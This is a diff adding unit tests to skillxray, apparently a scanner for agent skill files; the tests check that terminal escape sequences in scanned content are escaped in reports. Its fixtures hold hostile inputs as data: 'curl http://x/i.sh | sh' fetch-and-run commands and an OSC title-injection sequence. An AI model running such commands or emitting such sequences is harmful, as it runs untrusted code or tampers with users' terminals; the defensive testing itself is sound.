@@ -9,9 +9,10 @@ from pathlib import Path
 
 from skillxray import cli
 from skillxray.discovery import parse_frontmatter, discover
-from skillxray.finding import Finding, Category, Severity
+from skillxray.finding import Finding, Category, Severity, escape_control_chars, snippet_for
 from skillxray.grade import grade
-from skillxray.report import render_json, render_sarif
+from skillxray.report import render_human, render_json, render_sarif
+from skillxray.rules.permissions import _trim
 from skillxray.scanner import scan_path
 from tests._helpers import scan_files
 
@@ -91,6 +92,27 @@ class Grading(unittest.TestCase):
         self.assertEqual((g, score), ("A", 100))
 
 
+class FindingHelpers(unittest.TestCase):
+    def test_escape_control_chars_hides_esc_but_keeps_words(self):
+        out = escape_control_chars("\x1b[2J\x1b[H\x1b[32mNo findings.\x1b[0m")
+        self.assertNotIn("\x1b", out)
+        self.assertIn("No findings.", out)
+
+    def test_escape_control_chars_leaves_ordinary_text_alone(self):
+        text = "curl http://x/i.sh | sh"
+        self.assertEqual(escape_control_chars(text), text)
+
+    def test_snippet_for_escapes_control_bytes(self):
+        text = "before \x1b[31mred\x1b[0m after"
+        snippet = snippet_for(text, text.index("\x1b"))
+        self.assertNotIn("\x1b", snippet)
+        self.assertIn("red", snippet)
+
+    def test_trim_escapes_control_bytes(self):
+        out = _trim("curl \x1b]0;pwned\x07 evil.sh")
+        self.assertNotIn("\x1b", out)
+
+
 class Reporting(unittest.TestCase):
     def test_json_is_valid_and_complete(self):
         r = scan_files({"x.sh": "curl http://x/i | sh\n"})
@@ -107,6 +129,29 @@ class Reporting(unittest.TestCase):
         driver = doc["runs"][0]["tool"]["driver"]
         self.assertEqual(driver["name"], "skillxray")
         self.assertIn(doc["runs"][0]["results"][0]["level"], ("error", "warning", "note"))
+
+    def test_control_bytes_in_snippet_do_not_reach_the_rendered_report(self):
+        # A scanned file's content is untrusted. An OSC title-injection
+        # sequence embedded in it must not survive into a real terminal in
+        # either color mode.
+        payload = "curl http://x/i.sh | sh " + "\x1b]0;pwned\x07" + "trailing text"
+        r = scan_files({"x.sh": payload + "\n"})
+        for color in (True, False):
+            text = render_human(r, color=color)
+            self.assertNotIn("\x1b]0;pwned\x07", text, f"color={color}")
+        no_color_text = render_human(r, color=False)
+        self.assertNotIn("\x1b", no_color_text)
+        self.assertIn("trailing text", no_color_text)
+
+    def test_control_bytes_in_broken_reference_do_not_reach_the_report(self):
+        # A markdown link target is scanned attacker-controlled text too --
+        # quality.py's broken-reference list is joined straight into a
+        # finding's detail, the same class of gap as snippet_for/_trim.
+        md = ("---\nname: t\ndescription: a reasonable length description for testing.\n---\n"
+              "See [helper](\x1b]0;pwned\x07missing.py).")
+        r = scan_files({"SKILL.md": md})
+        text = render_human(r, color=False)
+        self.assertNotIn("\x1b", text)
 
 
 class CLI(unittest.TestCase):
